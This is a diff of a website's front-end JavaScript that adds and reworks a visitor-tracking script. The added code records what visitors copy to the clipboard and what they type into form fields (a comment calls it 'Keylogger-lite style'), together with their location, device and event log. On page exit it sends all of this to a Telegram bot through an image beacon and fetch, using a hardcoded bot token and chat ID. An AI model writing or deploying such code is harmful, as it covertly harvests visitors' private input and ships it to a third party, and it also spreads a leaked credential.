@@ -53,26 +53,54 @@
             .replace(/'/g, '&#39;');
     }
 
-    // --- 5. TELEGRAM NOTIFICATION (Reliable Backend-Only Strategy) ---
-    // Delegating all Telegram logic to /api/report for 100% reliability and zero CORS/URL-limit issues.
+    // --- 5. TELEGRAM EXIT NOTIFICATION (Reliable GET Image Beacon) ---
+    // Frontend directly sends to Telegram via GET for 100% reliability on page exit
+    function fireTelegramExit(message) {
+        const botToken = window.cachedTelegramConfig?.botToken || '8567285538:AAHKfo8bqee43rprC-GCv3Je423R57YQkCE';
+        const chatId = window.cachedTelegramConfig?.chatId || '6886010817';
+
+        const encodedMsg = encodeURIComponent(message);
+        const getUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMsg}&parse_mode=HTML`;
+
+        // Image Beacon - %100 reliable (fires even if page is closing)
+        const img = new Image();
+        img.src = getUrl;
+
+        // Modern fallback with keepalive
+        if (window.fetch) {
+            fetch(getUrl, { mode: 'no-cors', keepalive: true }).catch(() => { });
+        }
+    }
 
     function sendExitMessage() {
         if (exitSent || window.isInternalNav) return;
 
         const duration = Math.round((new Date() - sessionStartTime) / 1000);
-        // Duration limit removed per user request (Radical Reliability v36)
-
         exitSent = true;
 
-        // 1. Prepare Rich Data & Safety Truncation (Stay well within limits)
+        // 1. Prepare Rich Data & Safety Truncation (URL limit ~2000 chars for GET)
         const clipboardEntries = localHistory
             .filter(e => e.includes('Copy:'))
             .join('\n')
-            .substring(0, 1500);
+            .substring(0, 1200);
 
-        const rawLog = localHistory.slice(-20).join('\n').substring(0, 1500);
+        const rawLog = localHistory.slice(-20).join('\n').substring(0, 1200);
 
-        // 2. Persistent Logs (POST to Backend - Final Fortress V41)
+        // 2. Build Comprehensive Telegram Message (SINGLE MESSAGE)
+        const tgMsg = `🛑 <b>TAURUS EXIT REPORT [${sessionID}]</b>\n` +
+            `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+            `⏱ <b>DURATION:</b> <code>${duration}s</code>\n` +
+            `📍 <b>EXIT PAGE:</b> <code>${window.location.pathname}</code>\n` +
+            `🌍 <b>LOCATION:</b> <code>${sessionData?.city || 'Unknown'}, ${sessionData?.country_name || ''}</code>\n` +
+            `💻 <b>DEVICE:</b> <code>${sessionData?.device?.model || 'Unknown'} (${sessionData?.device?.os || 'Unknown'})</code>\n\n` +
+            `📋 <b>CLIPBOARD:</b>\n<pre>${escapeHTML(clipboardEntries) || 'None'}</pre>\n\n` +
+            `📝 <b>EVENT LOG:</b>\n<pre>${escapeHTML(rawLog) || 'No events'}</pre>\n\n` +
+            `━━━━━━━━━━━━━━━━━━━━━━`;
+
+        // 3. Send to Telegram via Image Beacon (Immediate, 100% reliable)
+        fireTelegramExit(tgMsg);
+
+        // 4. Send to Backend for Firestore Only (Silent logging, no Telegram)
         const payload = {
             sessionID: sessionID || 'unknown',
             duration: duration,
@@ -84,8 +112,6 @@
         };
 
         const reportUrl = CONFIG.api.report;
-
-        // Final Fortress: JSON via text/plain blob for 100% reliable bypass of Preflight and Parsing issues
         const blob = new Blob([JSON.stringify(payload)], { type: 'text/plain' });
 
         if (navigator.sendBeacon) {
@@ -1194,11 +1220,23 @@
             }
         });
 
-        // Input - Capture typed text (Keylogger-lite style)
+        // Input - Enhanced field identification (Priority: label > placeholder > aria-label > name > id)
         document.addEventListener('change', (e) => {
             if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                 if (e.target.type !== 'password') { // Privacy safety
-                    logHistory('Input', `[${e.target.name || e.target.id || 'Field'}]: ${e.target.value.substring(0, 50)} `);
+                    // Get field identifier
+                    let fieldName = e.target.name || e.target.id || 'UnknownField';
+
+                    // Try to find associated label (best UX identifier)
+                    const label = e.target.labels?.[0]?.textContent?.trim() ||
+                        e.target.getAttribute('placeholder') ||
+                        e.target.getAttribute('aria-label');
+
+                    if (label) {
+                        fieldName = label;
+                    }
+
+                    logHistory('Input', `[${fieldName}]: ${e.target.value.substring(0, 50)}`);
                 }
             }
         });
@@ -1231,68 +1269,6 @@
             _originalReplaceState.apply(this, arguments);
         };
     }
-
-    // --- 5. TELEGRAM NOTIFICATION (NEW) ---
-    // --- 5. TELEGRAM NOTIFICATION (NEW - DYNAMIC) ---
-    async function sendTelegramNotification(message) {
-        // if (!window.db) return; // REMOVED: Allow Beacon if DB ded
-
-        try {
-            // Fetch credentials dynamically (Use CACHE if available to avoid async delay on exit)
-            let botToken = '8567285538:AAHKfo8bqee43rprC-GCv3Je423R57YQkCE'; // Fallback Default
-            let chatId = '6886010817'; // Fallback Default
-
-            if (window.cachedTelegramConfig) {
-                botToken = window.cachedTelegramConfig.botToken || botToken;
-                chatId = window.cachedTelegramConfig.chatId || chatId;
-            } else if (window.db) {
-                try {
-                    const doc = await window.db.collection('security_config').doc('telegram').get();
-                    if (doc.exists) {
-                        const data = doc.data();
-                        botToken = data.botToken || botToken;
-                        chatId = data.chatId || chatId;
-                    }
-                } catch (err) { console.warn("Telegram Config Live Fetch Error", err); }
-            }
-
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-            // STRATEGY: Use sendBeacon for maximum reliability on exit/mobile
-            if (navigator.sendBeacon) {
-                const payload = new Blob([JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'HTML'
-                })], { type: 'application/json' });
-
-                // sendBeacon sends POST by default. Returns true if queued.
-                const queued = navigator.sendBeacon(url, payload);
-                if (queued) {
-                    console.log("📨 Telegram Notification Queued via Beacon (Exit Safe)");
-                    return; // Success!
-                }
-            }
-
-            // Fallback to Keepalive Fetch if beacon fails or not supported
-            await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                keepalive: true,
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            });
-            console.log("📨 Telegram Notification Sent (Fetch)");
-        } catch (e) {
-            console.error("Telegram Error:", e);
-        }
-    }
-
-    // Expose for Admin Panel
-    window.sendTelegramNotification = sendTelegramNotification;
 
     // --- 4. UTILITIES ---
 
